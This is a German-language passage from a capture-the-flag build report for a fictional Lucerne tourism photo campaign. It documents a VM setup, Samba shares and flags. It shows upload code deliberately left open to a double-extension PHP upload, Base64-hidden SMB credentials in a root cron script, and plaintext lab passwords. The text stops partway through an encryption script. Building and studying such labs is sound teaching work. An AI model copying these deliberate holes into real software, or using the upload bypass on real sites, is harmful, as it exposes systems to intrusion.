# Einleitung

Dieser Report beschreibt den Aufbau und die Konfiguration des CTF mit dem Thema “Luzerner Tourismusbüro”. Grundlage bildet die fiktive Kampagne **#LuzernerMoments**, bei der Teilnehmer: innen schrittweise verschiedene Flags finden müssen. Der Report erklärt die Idee hinter dem Szenario und beschreibt die technischen Komponenten und den Aufbau der einzelnen Flags. Ausserdem wird in einem Lösungs Walkthrough gezeigt, wie die Aufgaben gelöst werden können und welche Zusammenhänge zwischen den einzelnen Schritten bestehen.

## Zweck und Ziele

Zweck dieses CTF ist es, die Spieler:innen in ein realistisches Szenario zu versetzen, in dem sie verschiedene Aufgaben zur Erkennung und Ausnutzung von Schwachstellen lösen können. Dazu gehören das Aufspüren und Testen von Web-Schwachstellen, das Entwickeln und Erproben einfacher Payloads, das Lösen vorgegebener Kryptochallenges sowie das Erlernen von Techniken zur Privilege Escalation.

**Geförderte Fähigkeiten**

- Web-Recon: Suche nach Hinweisen und Artefakten in Webanwendungen
- Finden, Verknüpfen und Bewerten von Hinweisen im System
- Ausnutzen von Schwachstellen in einer Webanwendung
- Craften und Testen einer Payload
- Lösen einer kryptographischen Challenge gemäss vorgegebenem Verschlüsselungsmechanismus
- Erhöhen von Berechtigungen durch Injection

## **#LuzernerMoments – Dein Blick auf unsere Stadt**

Die Stadt Luzern ruft zur Aktion **#LuzernerMoments** auf. Gesucht sind die eindrücklichsten Augenblicke aus Luzern: das goldene Licht über dem Vierwaldstättersee, die Kapellbrücke im Morgennebel, festliche Stimmung rund um das Luzerner Stadtfest oder die stille Aussicht vom Pilatus. Touristinnen, Touristen und Einheimische laden ihr persönliches Highlight Foto hoch und beschreiben in wenigen Sätzen, warum gerade dieser Moment zählt. Jede Woche werden kleine Preise vergeben – von Museumspässen bis Schifffahrt-Tickets. Am Ende kürt eine Jury das kreativste und stimmungsvollste Bild der Saison und vergibt den Hauptpreis: ein atemberaubendes Wochenende in Luzern mit Sonnenuntergangsfahrt auf dem Vierwaldstättersee, Fototour, Rooftop-Dinner und Hotelnacht.

Die Kampagne musste kurzfristig aufgesetzt werden, da sich Hochsaison und das Luzerner Stadtfest überschneiden. Die Stadt ist voller Gäste und genau jetzt sollen die stärksten Eindrücke eingefangen werden. Um das Momentum zu nutzen, wurde die Aktion in wenigen Tagen aufgesetzt, Partner wurden eingebunden und die Teilnahme über Social Media verbreitet.

![Logo.png](attachment:e9af3aae-3b89-4099-a449-bde72ed5d8f8:Logo.png)

## Voraussetzungen

Ein solides Grundverständnis von Webanwendungen und der HTTP-Kommunikation (z. B. GET/POST, Statuscodes, Formularparametern, Cookies/Sessions) wird erwartet, ebenso wie praktische Erfahrung mit Web Enumeration Tools . Ausserdem sollten die Spieler:innen sicher mit der Kommandozeile umgehen können und in der Lage sein, einfache Skripte in Bash oder Python zu verstehen sowie anzupassen, um kleinere Aufgaben zu bewältigen. Für die vorgesehenen Aufgaben reichen grundlegende Kenntnisse in Kryptographie, wie die Unterschiede zwischen symmetrisch und asymmetrisch, Hashfunktionen, Base64 etc. aus. Ein Basiswissen über Linux Filesystemrechte, Besitzer/Gruppen, sudo-Konfigurationen sowie SUID/SGID ist für Privilege Escalation Aufgaben erforderlich. Eine eigene Exploit-Entwicklung ist nicht notwendig.

# Challenge-Aufbau & Dokumentation

In diesem Kapitel wird der komplette Aufbau des CTF dokumentiert. Es beschreibt die verwendeten Komponenten, die Konfigurationen und die Entscheidungen, die zur Erstellung der einzelnen Flags geführt haben. Das Ziel ist es, die Nachvollziehbarkeit und Reproduzierbarkeit der Aufgaben zu gewährleisten.

## Installation & initiale Konfiguration

### Technische Spezifikationen

Die CTF-Umgebung besteht aus einer Ubuntu Server 24.04.3 LTS VM. Diese Serverversion wurde gewählt, weil sie eine stabile  Grundlage bietet und viele erforderliche Werkzeuge für die Entwicklung und Durchführung der Aufgaben bereits beinhaltet.

- https://ubuntu.com/download/server#manual-install-tab

Die VM befindet sich in einem **NAT-Netzwerk (10.0.2.0/24)**. Diese Konfiguration ermöglicht es, innerhalb des virtuellen Netzwerks mehrere Systeme zu betreiben, während gleichzeitig über NAT eine Internetverbindung zur Installation benötigter Pakete oder Updates hergestellt werden kann.

| **Technische Spezifikationen der VM** | **Wert** |
| --- | --- |
| Betriebssystem | Ubuntu Server 24.04.3 LTS |
| Arbeitsspeicher | 2048 MB |
| Prozessoren | 2 virtuelle CPUs |
| Virtuelle Festplatte | 30 GB |
| Netzwerk | NAT (10.0.2.0/24) |
| Hostname | lutourismus |
| Weitere Einstellungen | Standardkonfiguration (default) |

### Deaktivierung LVM & Anlegen Benutzerkonto

Bei der Installation wurde LVM (Logical Volume Management) bewusst deaktiviert. Für ein CTF-Szenario ist eine dynamische Speicherverwaltung nicht erforderlich, da die Umgebung statisch aufgebaut und inhaltlich klar definiert ist.

![Deaktivierung LVM](attachment:7e4de03a-0a0a-4e78-87f8-ec99803347d1:Konfiguration_LVM.png)

Während der Installation des Betriebssystems wurde ein Benutzerkonto angelegt, um die Grundkonfiguration des Systems vorzunehmen.  Hierfür wurde der Benutzer `konfigurator` mit dem Passwort `konfig123` erstellt.  Der Benutzer verfügt über sudo Rechte, um administrative Aufgaben während der Einrichtung ausführen zu können. Nachdem die Systemeinrichtung abgeschlossen und alle CTF-relevanten Komponenten vorbereitet waren, wurde das Konto gelöscht, da es für das Lösen des CTF nicht mehr benötigt wird.

### Netzwerkkonfiguration

Auf dem Server wurde die statische IP-Adresse **10.0.2.10** konfiguriert, damit das System im virtuellen Netzwerk eindeutig identifizierbar ist.  Die Konfiguration erfolgte über die Datei `/etc/netplan/50-cloud-init.yaml`, in der die Netzwerkschnittstelle mit einer statischen Adresse, Gateway und DNS Server definiert wurde. Nach Anpassung der Datei wurde die neue Netzwerkkonfiguration mit dem Befehl `sudo netplan apply` aktiviert.

```bash
konfigurator@lutourismus:~$ sudo nano /etc/netplan/50-cloud-init.yaml

network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: false
      addresses:
        - 10.0.2.10/24
      routes:
        - to: default
          via: 10.0.2.1
      nameservers:
        addresses:
          - 192.168.1.1

konfigurator@lutourismus:~$ sudo netplan apply
```

### Installation OpenSSH

Sowohl für die Einrichtung als auch für die CTF Challenge wurde **OpenSSH** installiert, um eine Remoteverbindung zum System zu ermöglichen und die Verwaltung direkt über SSH durchführen zu können.

```bash
konfigurator@lutourismus:~$ sudo apt update
konfigurator@lutourismus:~$ sudo apt install openssh-server
konfigurator@lutourismus:~$ sudo systemctl enable ssh
konfigurator@lutourismus:~$ sudo systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: active (running) since Sat 2025-10-11 09:28:26 UTC; 2min 14s ago
TriggeredBy: ● ssh.socket
       Docs: man:sshd(8)
             man:sshd_config(5)
   Main PID: 7257 (sshd)
      Tasks: 1 (limit: 2267)
     Memory: 1.2M (peak: 1.5M)
        CPU: 90ms
     CGroup: /system.slice/ssh.service
             └─7257 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

Oct 11 09:28:26 lutourismus sshd[7257]: Server listening on 0.0.0.0 port 22.
Oct 11 09:28:26 lutourismus sshd[7257]: Server listening on :: port 22.
Oct 11 09:28:26 lutourismus systemd[1]: Started ssh.service - OpenBSD Secure Shell server.
```

### Aktivierung root

Die Entwickler von Ubuntu haben beschlossen, das administrative Root Konto in Standardinstallationen zu deaktivieren. Stattdessen wird für administrative Aufgaben `sudo` verwendet (siehe [Ubuntu Dokumentation](https://documentation.ubuntu.com/) ). Nach der Installation wurde das Root Konto aktiviert, indem ein Passwort gesetzt wurde. Das Passwort besitzt eine ausreichende Länge und Komplexität, sodass es nicht durch eine einfache Brute-Force Attacke erraten werden kann.

- Username: `root`
- Password:  `lOREHS990RjU19cQN1V3eIKFNQV4V3`

```bash
konfigurator@lutourismus:~$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
```

### Offene Ports

Folgende Ports sind auf der VM geöffnet.

| Port | Service | Status |
| --- | --- | --- |
| 22 | SSH | Open |
| 80 | HTTP | Open |
| 445, 139 | SMB | Open |

## Flag Übersicht

Die folgende Tabelle zeigt eine Übersicht aller im CTF implementierten Flags, inklusive kurzer Hinweise und des Speicherorts.

| Flag | Pfad | Hinweise |
| --- | --- | --- |
| flag{initial_access_luzernermoments_83723} | /home/webflag/flag.txt | robots.txt, Upload-Formular, Fehlermeldungen |
| flag{operator_crypto_2025_7f4b9a} | /home/operator/operator.txt | /share/internalIT/DisasterRecovery.txt, /share/internalIT/TODO.txt |
|  |  |  |

## Flag 1:  Initial Access - Webseite

Im folgenden Kapitel wird der Aufbau des ersten Flags beschrieben. Durch das Lösen dieses Flags erhält der Spieler:in Initial Access zum System über eine Remote Code Execution (RCE) Schwachstelle in der Webanwendung.

### Einführung

Die Stadt Luzern hat kurzfristig eine Kampagne namens **#LuzernerMoments** gestartet, bei der Touristen und Einheimische ihre schönsten Fotos aus Luzern hochladen können. Aufgrund des Zeitdrucks wurde die Webanwendung schnell entwickelt, wobei Sicherheitsaspekte vernachlässigt wurden. Die Spieler:innen sollen die Schwachstellen in der Upload-Funktionalität identifizieren und ausnutzen, um Zugriff auf das System zu erlangen.

### Installation der Webseite

Die Webseite wird auf dem Ubuntu Server mit Apache2 und PHP 8.3 betrieben. Für die Installation wurde ein automatisiertes Bash-Skript (`install.sh`) erstellt, welches alle erforderlichen Komponenten installiert und konfiguriert.

Das Installations-Script führt folgende Schritte aus:

1. Aktualisierung der Paketlisten
2. Installation von Git (falls nicht vorhanden)
3. Klonen des Repositories von GitHub: https://github.com/Flurin17/cyberwars
4. Installation von Apache2 und PHP
5. Kopieren der Website-Dateien nach `/var/www/html`
6. Erstellung der Verzeichnisstruktur (`uploads/`, `data/`)
7. Setzen der korrekten Berechtigungen
8. Erstellung des System-Users `webflag`
9. Erstellung der Flag-Datei
10. Aktivierung und Start von Apache

```bash
konfigurator@lutourismus:~$ sudo bash install.sh
```

### Komponenten der Webanwendung

Die Webanwendung besteht aus folgenden Komponenten:

| **Datei** | **Beschreibung** |
| --- | --- |
| `index.php` | Hauptseite mit Upload-Formular und Kampagneninformation |
| `upload.php` | Upload-Handler mit Schwachstelle |
| `gallery.php` | Galerie mit hochgeladenen Bildern |
| `thanks.php` | Bestätigungsseite nach erfolgreichem Upload |
| `config.php` | Konfigurationsdatei mit Pfaden und Einstellungen |
| `functions.php` | Hilfsfunktionen für Submission-Verwaltung |
| `assets/style.css` | Stylesheet für modernes Design |
| `robots.txt` | Robots-Datei mit Hinweisen auf gesperrte Verzeichnisse |
| `.htaccess` | Apache-Konfiguration |
| `uploads/` | Verzeichnis für hochgeladene Dateien |
| `data/submissions.jsonl` | JSONL-Datei mit Submission-Daten |

### Implementierte Schwachstellen

Die Upload-Funktionalität in `upload.php` enthält mehrere absichtliche Sicherheitslücken:

#### 1. Dateiendungs-Check statt Inhaltsprüfung

Die Applikation prüft **nur die Dateiendung** mit `pathinfo()` und akzeptiert Uploads, wenn die Endung zu den erlaubten Formaten gehört (`.jpg`, `.jpeg`, `.png`, `.gif`). Es erfolgt **keine Prüfung der tatsächlichen Dateiinhalte** (Magic Bytes) oder des MIME-Types.

```php
$fileExtension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array($fileExtension, $allowedExtensions)) {
    die('Ungültiges Dateiformat. Erlaubt sind: JPG, JPEG, PNG, GIF');
}
```

Ein Angreifer kann eine Datei mit **Double-Extension** hochladen (z. B. `shell.php.jpg`). Die Applikation erkennt die Endung `.jpg` und akzeptiert den Upload, jedoch interpretiert Apache die Datei als PHP-Code, da `.php` in der Dateiendung enthalten ist.

#### 2. Uploads in ausführbares Web-Verzeichnis

Die hochgeladenen Dateien werden direkt in das Verzeichnis `uploads/` innerhalb des DocumentRoot gespeichert. Dieses Verzeichnis ist vom Webserver aus direkt erreichbar und **PHP-Code wird standardmässig ausgeführt**.

In einer sicheren Konfiguration würde:
- PHP-Ausführung im Upload-Verzeichnis deaktiviert sein
- Uploads ausserhalb des DocumentRoot gespeichert werden
- Eine strikte Content-Type-Prüfung erfolgen
- Magic-Byte-Validierung implementiert sein

#### 3. Fehlende .htaccess-Absicherung

Die `.htaccess`-Datei enthält **keinen Schutz** gegen PHP-Ausführung im `uploads/`-Verzeichnis. In einer sicheren Konfiguration würde dort stehen:

```apache
<Directory "/var/www/html/uploads">
    php_flag engine off
</Directory>
```

Dies würde die Ausführung von PHP-Code im Upload-Verzeichnis verhindern.

### Erstellung System-User und Flag

Für das Flag wurde ein dedizierter System-User namens **`webflag`** erstellt, der keinen interaktiven Login besitzt:

```bash
konfigurator@lutourismus:~$ sudo useradd -r -m -s /usr/sbin/nologin webflag
```

Das Flag wurde in der Datei `/home/webflag/flag.txt` gespeichert und ist nur für den User `webflag` lesbar:

```bash
root@lutourismus:~# echo "flag{initial_access_luzernermoments_83723}" > /home/webflag/flag.txt
root@lutourismus:~# chown webflag:webflag /home/webflag/flag.txt
root@lutourismus:~# chmod 444 /home/webflag/flag.txt
root@lutourismus:~# ls -l /home/webflag/
total 4
-r--r--r-- 1 webflag webflag 43 Oct 19 2025 flag.txt
```

- **Flag:** `flag{initial_access_luzernermoments_83723}`
- **Pfad:** `/home/webflag/flag.txt`
- **Berechtigungen:** `444` (alle können lesen, niemand kann schreiben)

### Hinweise für Spieler:innen

Um die Spieler:innen in die richtige Richtung zu lenken, wurden folgende Hinweise implementiert:

1. **robots.txt**: Enthält Einträge für `/uploads/` und `/backup_smb.sh`, was auf interessante Verzeichnisse und Dateien hinweist
2. **Upload-Formular**: Zeigt deutlich, welche Dateitypen akzeptiert werden
3. **Fehlermeldungen**: Geben klare Hinweise auf die Validierungslogik
4. **Galerie**: Zeigt hochgeladene Dateien und deren Speicherort

## Flag 2: Operator Access - Crypto Challenge

Im folgenden Kapitel wird der Aufbau des zweiten Flags beschrieben. Durch das Lösen dieses Flags erhält der Spieler:in in Zugriff auf den Operator Account, der über zusätzliche Rechte verfügt.

### Einführung

Nach dem Initial Access richtet sich die Suche auf ein Skript namens **`backup_smb.sh`**. Dieses Skript wird regelmässig per Cronjob ausgeführt und legt ein Backup der Upload-Daten auf dem internen, geschützten SMB-Share ab. In **`backup_smb.sh`** sind die Zugangsdaten für genau dieses geschützte Share *versehentlich* Base64-kodiert hinterlegt worden. Durch einfaches Dekodieren der Base64-Zeichenfolge erhält man das Passwort des SMB-Kontos und damit Zugriff auf den Share.

Auf dem geschützten Share findet man eine verschlüsselte Datei **`encrypted.enc`** sowie ein Python-Skript namens **`encrypt.py`** das zeigt, wie die Datei verschlüsselt wurde. In der Datei ist das Passwort des Operator Accounts verschlüsselt abgelegt als Disaster Recovery Backup. Ausserdem liegt eine kurze interne TODO-Notiz, welche erwähnt, dass während der Test-Phase temporäre Schlüsseldateien hinterlegt wurden und dass das Verzeichnis geprüft und bereinigt werden sollte. Die Spieler:innen müssen die Schlüssel finden, das Python-Skript analysieren, die einzelnen Verschlüsselungsschritte nachvollziehen und die Reihenfolge umkehren, um das ursprünglich verschlüsselte Passwort wiederherzustellen, etwa mit CyberChef oder einem kurzen eigenen Entschlüsselungsprogramm.

### Erstellung Systemaccount für SMB Zugriff

Für das Backupskript wird das Systemkonto **`backupsmb`** verwendet, das nur Zugriff auf den geschützten SMB-Share besitzt und **keinen interaktiven Login** auf dem System erlaubt. Er dient ausschliesslich dazu, Dateien auf den Share abzulegen.

```bash
konfigurator@lutourismus:~$ sudo adduser --system backupsmb
[sudo] password for konfigurator: 
info: Selecting UID from range 100 to 999 ...

info: Adding system user `backupsmb' (UID 110) ...
info: Adding new user `backupsmb' (UID 110) with group `nogroup' ...
info: Not creating `/nonexistent'.

konfigurator@lutourismus:/home$ getent passwd backupsmb
backupsmb:x:110:65534::/nonexistent:/usr/sbin/nologin
```

- `--system`: Erstellt einen Systembenutzer mit einer UID unter 1000, ohne Passwort, ohne Home-Verzeichnis und mit der Shell `/usr/sbin/nologin`. Der Benutzer kann sich nicht interaktiv anmelden und wird ausschliesslich für Dienste oder automatisierte Prozesse verwendet.

### Anlegen Gruppe für interne IT

Um die Zugriffsrechte auf die SMB-Freigabe gezielter steuern zu können, wurde eine Gruppe namens **`internalIT`** erstellt. Der Benutzer **`backupsmb`** wurde dieser Gruppe hinzugefügt, damit er über seine Gruppenzugehörigkeit auf die Freigabe zugreifen und die erforderlichen Lese- und Schreibvorgänge ausführen kann.

```bash
konfigurator@lutourismus:/$ sudo groupadd internalIT
[sudo] password for konfigurator: 
konfigurator@lutourismus:/$ sudo usermod -aG internalIT backupsmb
```

### Installation Samba

Samba wird verwendet, um auf dem Linux-Server SMB-Shares bereitzustellen und so den Dateizugriff über das Netzwerk zu ermöglichen. Auf dem Ubuntu Server wurde Samba (Version 4.19.5-Ubuntu) mit dem folgenden Befehlen installiert.

- https://ubuntu.com/tutorials/install-and-configure-samba#2-installing-samba
- https://www.dedicatedcore.com/blog/install-samba-ubuntu/

```bash
konfigurator@lutourismus:~$ sudo apt update
konfigurator@lutourismus:~$ sudo apt install samba -y
konfigurator@lutourismus:~$ whereis samba
samba: /usr/sbin/samba /usr/lib/x86_64-linux-gnu/samba /etc/samba /usr/libexec/samba /usr/share/samba /usr/share/man/man7/samba.7.gz /usr/share/man/man8/samba.8.gz
```

### Erstellung der Verzeichnisstruktur

Für die Freigaben wurde zunächst der Ordner `/share` angelegt. Innerhalb dieses Verzeichnisses befinden sich die beiden Unterordner `/share/internalIT` und `/share/public`. Zusätzlich wurde innerhalb von `/share/internalIT` der Unterordner `/share/internalIT/backup` erstellt, in dem das Backupskript die Upload-Dateien kopiert.

Im Ordner **`internalIT`** befinden sich die relevanten Dateien und Dokumente, die für das CTF von Bedeutung sind. Der Ordner **`public`** hingegen ist nicht CTF relevant; dort liegt lediglich eine Datei, die als Teil der Marketingkampagne dient und zur thematischen Gestaltung des CTF beiträgt.

Auf den Ordnern wurde das SGID-Bit gesetzt, um sicherzustellen, dass neu erstellte Dateien und Unterordner automatisch der Gruppe **`internalIT`** zugeordnet werden.

```bash
konfigurator@lutourismus:/$ su root
Password: 
root@lutourismus:/# mkdir share
root@lutourismus:/# mkdir /share/public
root@lutourismus:/# mkdir /share/internalIT
root@lutourismus:/# mkdir /share/internalIT/backup

root@lutourismus:/# sudo chown root:internalIT /share/public
root@lutourismus:/# sudo chmod 2775 /share/public
root@lutourismus:/# sudo chown root:internalIT /share/internalIT
root@lutourismus:/# sudo chmod 2770 /share/internalIT
root@lutourismus:/# sudo chown backupsmb:internalIT /share/internalIT/backup
root@lutourismus:/# sudo chmod 2750 /share/internalIT/backup

root@lutourismus:/# cd /share
root@lutourismus:/share# ls -l
total 8
drwxrws--- 3 root internalIT 4096 Oct 13 18:44 internalIT
drwxrwsr-x 2 root internalIT 4096 Oct 11 10:53 public

root@lutourismus:/share/internalIT# ls -l
total 4
drwxr-s--- 2 backupsmb internalIT 4096 Oct 13 17:49 backup
```

| **Ordner** | **Besitzer** | **Gruppe** | **Rechte** | **backupsmb** | **Mitglieder der Gruppe internalIT** | **Andere Benutzer** | **Beschreibung / Zugriff** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `/share/public` | root | internalIT | `drwxrwsr-x` (2775) | Schreiben/Lesen | Vollzugriff | Lesen | Öffentlich lesbar |
| `/share/internalIT` | root | internalIT | `drwxrws---` (2770) | Schreiben/Lesen | Vollzugriff | Kein Zugriff | Geschützter Bereich für die Gruppe internalIT |
| `/share/internalIT/backup` | backupsmb | internalIT | `drwxr-s---` (2750) | Vollzugriff | Nur Lesezugriff | Kein Zugriff | Backup Ordner, in dem backupsmb Dateien speichern kann |

### Anpassung Globale Variablen Samba

In der Samba Konfiguration wurde die Einstellung für die Netzwerkschnittstellen angepasst, damit der Dienst nicht nur lokal, sondern auch über die IP-Adresse des Servers erreichbar ist. 
Hier wurde die IP-Adresse des Ubutnu Servers **`10.0.2.10/24`** eingetragen.

```bash
konfigurator@lutourismus:~$ sudo nano /etc/samba/smb.conf
...
# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 10.0.2.10/24
...
```

### Konfiguration Samba Shares

Als Erstes wurde der **`print$`** Share aus der Samba Konfiguration entfernt, da dieser für das CTF nicht benötigt wird. Die Freigabe dient standardmässig zur Bereitstellung von Druckertreibern für Windows Clients.

```bash
# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

In der Samba-Konfiguration wurden zwei Freigaben eingerichtet: **`public`** und **`internalIT`**. Die Freigabe **`public`** dient als öffentlich zugänglicher Bereich, auf den anonym (ohne Benutzername und Passwort) zugegriffen werden kann. Sie ist **read-only** konfiguriert, sodass Dateien nur gelesen, aber nicht verändert oder gelöscht werden können. Durch die Einstellung **browsable = yes** wird der Share beim Durchsuchen des Servers angezeigt, was die Auffindbarkeit im Netzwerk erleichtert.

Die zweite Freigabe **`internalIT`** ist für autorisierte Benutzer der Gruppe internalIT vorgesehen. Sie erlaubt Lese- und Schreibzugriff, sodass Mitglieder der Gruppe Dateien gemeinsam bearbeiten können. Auch hier ist **browsable = yes** aktiviert, damit die Freigabe im Netzwerk sichtbar ist. 

```bash
...
[public]
   comment = Öffentliche Freigabe
   path = /share/public
   browsable = yes
   guest ok = yes
   read only = yes

[internalIT]
   comment = Interner IT Share
   path = /share/internalIT
   browsable = yes
   writable = yes
   valid users = @internalIT
   create mask = 0660
   directory mask = 0770
```

### Aktivierung User für Samba

Damit der Benutzer **`backupsmb`** für den Zugriff auf den Share genutzt werden kann, musste zunächst ein separates Samba Passwort hinterlegt werden. Samba verwendet nämlich eine eigene Passwortdatenbank und greift **nicht automatisch auf die Systempasswörter** zu.

- Username: `backupsmb`
- Password: `yMTrTbAc56U2O80wTllY8Tg1mJJYOw`

```bash
konfigurator@lutourismus:~$ sudo smbpasswd -a backupsmb
```

### Erstellung Backupskript

Für die Erstellung der Backups wurde ein Bash-Skript erstellt, welches die Dateien aus dem Upload Verzeichnis sichert. Dabei wird der Inhalt des Quellordners zu einem `.tar.gz`-Archiv komprimiert und mit dem aktuellen Datum gekennzeichnet. Anschliessend überträgt das Skript das Archiv über den SMB-Client auf den SMB-Share. Das Skript liegt unter `/usr/local/sbin/backup_smb.sh`.

Im Skript sind der Benutzername und die Zugangsdaten des Benutzers **`backupsmb`** in **Base64** hinterlegt, über die die Verbindung zum SMB-Share hergestellt wird. Durch das Dekodieren erhalten die Spieler:innen Zugriff auf den **`internalIT`** Share und können dort weitere Dateien einsehen.

```bash
#!/bin/bash

SRC="/home/test"
DST="//10.0.2.10/internalIT"
LOG="/var/log/backup.log"
DATE=$(date +%Y-%m-%d_%H-%M-%S)
ARCHIVE="/tmp/uploads_$DATE.tar.gz"
RETENTION_DAYS=7

U=$(echo YmFja3Vwc21i | base64 -d)
P=$(echo eU1UclRiQWM1NlUyTzgwd1RsbFk4VGcxbUpKWU93 | base64 -d)

log_info()  { echo "[INFO]  $1"  >> $LOG; }
log_error() { echo "[ERROR] $1" >> $LOG; }

log_info "---------------------------------------------"
log_info "Backup process started at $(date)"

# Prüfen, ob Quellverzeichnis existiert
if [ ! -d "$SRC" ]; then
    log_error "Source directory $SRC not found!"
    exit 1
fi

# Prüfen auf mind. 500 MB freien Speicherplatz
FREE_SPACE=$(df --output=avail /tmp | tail -1)
if [ "$FREE_SPACE" -lt 512000 ]; then
    log_error "Not enough space in /tmp for backup archive!"
    exit 1
fi

# Backup erstellen
tar -czf "$ARCHIVE" -C "$(dirname "$SRC")" "$(basename "$SRC")" 2>> $LOG
if [ $? -ne 0 ]; then
    log_error "Error creating archive!"
    exit 1
fi
log_info "Archive created successfully: $ARCHIVE"

# Archiv in den Ordner 'backup' auf dem Share hochladen
smbclient "$DST" -U "${U}%${P}" -c "cd backup; put $ARCHIVE $(basename "$ARCHIVE")" 2>&1 | while read -r line; do
    log_info "$line"
done

if [ $? -eq 0 ]; then
    log_info "Backup uploaded successfully to internalIT/backup: $(basename "$ARCHIVE")"
    
    # Lokale Archivdatei nach erfolgreichem Upload löschen
    rm -f "$ARCHIVE"
    if [ $? -eq 0 ]; then
        log_info "Local archive deleted from /tmp: $(basename "$ARCHIVE")"
    else
        log_error "Failed to delete local archive: $(basename "$ARCHIVE")"
    fi
else
    log_error "Upload failed!"
    exit 1
fi

# Alte temporäre Backups löschen (Sicherheitsmaßnahme, falls alte übrig sind)
find /tmp -name "uploads_*.tar.gz" -type f -mtime +$RETENTION_DAYS -exec rm {} \; >> $LOG 2>&1
log_info "Old local backups older than $RETENTION_DAYS days removed."

log_info "Backup finished successfully at $(date)"
log_info "---------------------------------------------"
```

Die Datei darf nur von Root bearbeitet werden, kann jedoch von allen anderen Benutzern gelesen werden. Damit das Skript erfolgreich ausgeführt werden kann, musste zuvor der **SMB-Client** installiert werden. Zudem wurde das Execute Recht für das Skript gesetzt, damit es von root als Programm gestartet werden kann.

```bash
konfigurator@lutourismus:~$ sudo apt install smbclient -y
konfigurator@lutourismus:/usr/local/sbin$ sudo chmod 744 backup_smb.sh
konfigurator@lutourismus:/usr/local/sbin$ ls -l
total 4
-rwxr--r-- 1 root root 2012 Oct 11 13:46 backup_smb.sh
```

### Einrichten Cronjob für Backupskript

Ein Cronjob wurde eingerichtet, um das Backup-Skript regelmässig auszuführen. Der Cronjob ist im systemweiten Verzeichnis `/etc/cron.d/` abgelegt. Durch den Cronjob wird das Backupskript alle 12 Stunden automatisch mit root-Rechten ausgeführt. Der Wert `0` repräsentiert die Minute, `*/12` steht für alle zwölf Stunden und der Benutzer `root` bestimmt, dass der Job mit administrativen Rechten ausgeführt wird. Die Berechtigungen werden automatisch so gesetzt, dass die Cronjob Datei von allen Benutzern gelesen, jedoch nur von root bearbeitet werden kann.

- [https://www.strongdm.com/blog/set-up-cron-job-linux#:~:text=For system-wide cron jobs,choose your preferred text editor](https://www.strongdm.com/blog/set-up-cron-job-linux#:~:text=For%20system%2Dwide%20cron%20jobs,choose%20your%20preferred%20text%20editor)

```bash
konfigurator@lutourismus:~$ sudo nano /etc/cron.d/backup_smb
# Führt alle 12 Stunden das Backupskript aus
0 */12 * * * root /usr/local/sbin/backup_smb.sh

konfigurator@lutourismus:~$ ls -l /etc/cron.d
total 12
-rw-r--r-- 1 root root  94 Oct 11 15:46 backup_smb
...
```

### Erstellung Operator Account

Nach dem Lösen der Crypto Challenge erhält der Spieler:in Zugriff auf den **Operator Account**. Dieser Benutzer wird für die Privilege Escalation im dritten Flag verwendet, da er erweiterte Lese- und Schreibrechte auf bestimmte Dateien besitzt. Als Primärgruppe wurde **`internalIT`** festgelegt.

- Username: `operator`
- Password: `J5p57xAr4MrQ2LrcFzDILsbdQqUM0g`

```bash
konfigurator@lutourismus:~$ sudo useradd -m -s /bin/bash -g internalIT operator
konfigurator@lutourismus:~$ sudo passwd operator
New password: 
Retype new password: 
passwd: password updated successfully
```

### Erstellung Python Skript (Verschlüsselung)

Für die Ausführung des Python Verschlüsselungsskripts wurden zuvor weitere Pakete installiert , um die verwendeten Algorithmen (AES, RC4 usw.) nutzen zu können. Hierfür wurden mit dem Paketmanager **pip** die Pakete **pycryptodome** und **arc4** installiert.

Durch die Option `--break-system-packages` werden diese Pakete systemweit eingebunden, sodass das Skript direkt über `python3` ausgeführt werden kann. Dieses Vorgehen ist jedoch **nicht empfehlenswert**, da systemweite Änderungen zu Instabilitäten führen können. In produktiven Umgebungen sollte stattdessen ein **Virtual Environment** verwendet werden.

```bash
konfigurator@lutourismus:~$ sudo apt install python3-pip -y
konfigurator@lutourismus:~$ sudo pip3 install pycryptodome --break-system-packages
konfigurator@lutourismus:~$ sudo pip3 install arc4 --break-system-packages
```

Für die Verschlüsselung des **Operator Passworts** wurde ein Python-Skript mit dem Namen **`encrypt.py`** erstellt. Dieses Skript verschlüsselt einen über den Parameter `-i` übergebenen String und speichert das Ergebnis als Chiffretext in der Datei **`encrypted.enc`**. Beide Dateien befinden sich im Verzeichnis `/share/internalIT`.

Das Skript führt eine mehrstufige Verschlüsselung durch. Zunächst wird der Klartext mit AES im CBC-Modus verschlüsselt. Anschliessend erfolgt eine zusätzliche XOR-Verschlüsselung, bevor die Daten mit gzip komprimiert werden. Im letzten Schritt werden die komprimierten Daten mit dem RC4-Algorithmus verschlüsselt. Das Endergebnis wird schliesslich im HEX Fomat in der Ausgabedatei gespeichert.

Der Parameter **`b`** vor den Schlüsseln (z. B. `b"AES_R1v3r_2025_SUP3R_S3cur3_K3y!"`) kennzeichnet in Python sogenannte **Byte Strings**. Dies ist erforderlich, da kryptografische Bibliotheken wie **PyCryptodome** oder **arc4** ausschliesslich mit Bytefolgen und nicht mit Textstrings arbeiten.

- https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html
- https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html

```python
#!/usr/bin/env python3
import sys, argparse, gzip, io, os
from Crypto.Cipher import AES
from arc4 import ARC4

def pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def xor_bytes(data: bytes, key: bytes) -> bytes:
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        out[i] = b ^ key[i % klen]
    return bytes(out)

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--input", help="Input string or file path", required=True)
parser.add_argument("-o", "--output", help="Output file name", default="encrypted.enc")
args = parser.parse_args()

if os.path.isfile(args.input):
    with open(args.input, "rb") as f:
        plaintext = f.read()
else:
